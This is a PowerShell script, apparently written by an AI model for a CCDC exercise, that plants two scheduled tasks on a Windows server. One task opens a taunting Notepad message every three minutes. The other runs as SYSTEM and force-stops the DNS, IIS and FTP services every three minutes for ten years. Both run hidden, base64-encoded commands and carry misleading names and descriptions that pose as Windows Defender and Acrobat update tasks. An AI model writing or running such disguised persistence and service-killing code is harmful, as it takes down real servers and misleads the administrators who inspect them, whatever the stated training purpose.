# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC Scheduled Task Injection
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# Claude 4.6
# "now I need powershell scripts for my windows users. I want you to create 
# a script that puts 2 scheduled tasks on the device on the windows server 2019.
# One will open notepad on the device and write "hello! check your scheduled tasks!"
# every 3 minutes and then another will stop the DNS, FTP, and IIS service on windows"
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

# THIS SCRIPT PUTS SCHEDULED TASKS IN THE DEVICE


#Requires -RunAsAdministrator

# -- Colour helpers ------------------------------------------------------------
function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan    }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green   }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow  }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red     }

Write-Host ""
Write-Warn  "========================================================"
Write-Warn  " CCDC Blue Team Training  -  Scheduled Task Injector"
Write-Warn  "========================================================"
Write-Host ""

# =============================================================================
# TASK 1  -  SillyNotepadAlert
# Opens Notepad every 3 minutes, pre-loaded with a taunting message written
# to a temp file so trainees see it when they tab into the session.
# =============================================================================

$Task1Name        = "NotepadAlert"
$Task1Description = "Windows Defender credential cache refresh task (do not disable)"
$Task1MessageFile = "C:\Windows\Temp\sys_alert_msg.txt"
$Task1Message     = "AHHHHH MY INTERNALS! STOP RUNNING YOUR CYBERSECURITY TOOLS ON MY BODY! THEY HURT! AS A RESULT, I WILL BE REMOVING REGISTRY FILES EVERY TIME YOU SEE THIS"

# The action: write the message file then open it in Notepad
$Task1ScriptBlock = @"
Set-Content -Path '$Task1MessageFile' -Value '$Task1Message' -Force
Start-Process -FilePath 'notepad.exe' -ArgumentList '$Task1MessageFile'
"@

# Encode the scriptblock so it survives the task scheduler argument quoting
$Task1Encoded = [Convert]::ToBase64String(
    [System.Text.Encoding]::Unicode.GetBytes($Task1ScriptBlock)
)

$Task1Action  = New-ScheduledTaskAction `
    -Execute    "powershell.exe" `
    -Argument   "-NonInteractive -WindowStyle Hidden -EncodedCommand $Task1Encoded"

$Task1Trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 3) `
    -RepetitionDuration (New-TimeSpan -Days 3650) `
    -Once -At (Get-Date).AddSeconds(10)   # start almost immediately
# [System.TimeSpan]::MaxValue serializes to P99999999DT23H59M59S which the Task Scheduler
# XML parser rejects (HRESULT 0x80041318). 3650 days (10 years) is the practical max.

$Task1Settings = New-ScheduledTaskSettingsSet `
    -ExecutionTimeLimit     (New-TimeSpan -Minutes 5) `
    -RestartCount           3 `
    -RestartInterval        (New-TimeSpan -Minutes 1) `
    -StartWhenAvailable     `
    -RunOnlyIfNetworkAvailable:$false

# Run as interactive users, NOT SYSTEM. SYSTEM processes live in Session 0
# (the service isolation session)  -  Notepad spawned from there is invisible
# to logged-in users. Running as BUILTIN\Users means the task fires in the
# logged-on user's own session so Notepad actually appears on their desktop.
$Task1Principal = New-ScheduledTaskPrincipal `
    -GroupId   "BUILTIN\Users" `
    -RunLevel  Highest

Write-Info "Registering scheduled task: $Task1Name ..."

try {
    # Remove if already exists
    Unregister-ScheduledTask -TaskName $Task1Name -Confirm:$false -ErrorAction SilentlyContinue

    Register-ScheduledTask `
        -TaskName   $Task1Name `
        -Action     $Task1Action `
        -Trigger    $Task1Trigger `
        -Settings   $Task1Settings `
        -Principal  $Task1Principal `
        -Description $Task1Description `
        -Force | Out-Null

    Write-Success "Task registered: $Task1Name"
    Write-Success "  Schedule : every 3 minutes"
    Write-Success "  Action   : Notepad opens '$Task1MessageFile'"
    Write-Success "  Runs as  : BUILTIN\Users (interactive session  -  Notepad will be visible)"
} catch {
    Write-Err "Failed to register ${Task1Name}: $_"
}

Write-Host ""

# =============================================================================
# TASK 2  -  SillyServiceKiller
# Stops DNS (DNS), FTP (MSFTPSVC), and IIS (W3SVC) every 3 minutes.
# Uses real Windows service names. Disguised as a "maintenance" task.
# =============================================================================

$Task2Name        = "AcrobatUpdateTask"
$Task2Description = "Acrobat Update Services maintenance cleanup (system managed)"

# Real Windows service names:
#   DNS Server       = DNS
#   IIS (W3SVC)      = W3SVC
#   FTP (IIS FTP)    = MSFTPSVC  (requires IIS FTP feature to be installed)

$Task2ScriptBlock = @'
$services = @('DNS','W3SVC','MSFTPSVC')
foreach ($svc in $services) {
    try {
        $s = Get-Service -Name $svc -ErrorAction SilentlyContinue
        if ($s -and $s.Status -eq 'Running') {
            Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
        }
    } catch {}
}
'@

$Task2Encoded = [Convert]::ToBase64String(
    [System.Text.Encoding]::Unicode.GetBytes($Task2ScriptBlock)
)

$Task2Action  = New-ScheduledTaskAction `
    -Execute  "powershell.exe" `
    -Argument "-NonInteractive -WindowStyle Hidden -EncodedCommand $Task2Encoded"

$Task2Trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 3) `
    -RepetitionDuration (New-TimeSpan -Days 3650) `
    -Once -At (Get-Date).AddSeconds(30)   # stagger slightly from Task 1

$Task2Settings = New-ScheduledTaskSettingsSet `
    -ExecutionTimeLimit     (New-TimeSpan -Minutes 5) `
    -RestartCount           3 `
    -RestartInterval        (New-TimeSpan -Minutes 1) `
    -StartWhenAvailable     `
    -RunOnlyIfNetworkAvailable:$false

$Task2Principal = New-ScheduledTaskPrincipal `
    -UserId    "SYSTEM" `
    -LogonType ServiceAccount `
    -RunLevel  Highest

Write-Info "Registering scheduled task: $Task2Name ..."

try {
    Unregister-ScheduledTask -TaskName $Task2Name -Confirm:$false -ErrorAction SilentlyContinue

    Register-ScheduledTask `
        -TaskName    $Task2Name `
        -Action      $Task2Action `
        -Trigger     $Task2Trigger `
        -Settings    $Task2Settings `
        -Principal   $Task2Principal `
        -Description $Task2Description `
        -Force | Out-Null

    Write-Success "Task registered: $Task2Name"
    Write-Success "  Schedule : every 3 minutes"
    Write-Success "  Action   : Stop-Service DNS, W3SVC (IIS), MSFTPSVC (FTP)"
    Write-Success "  Runs as  : SYSTEM"
} catch {
    Write-Err "Failed to register ${Task2Name}: $_"
}
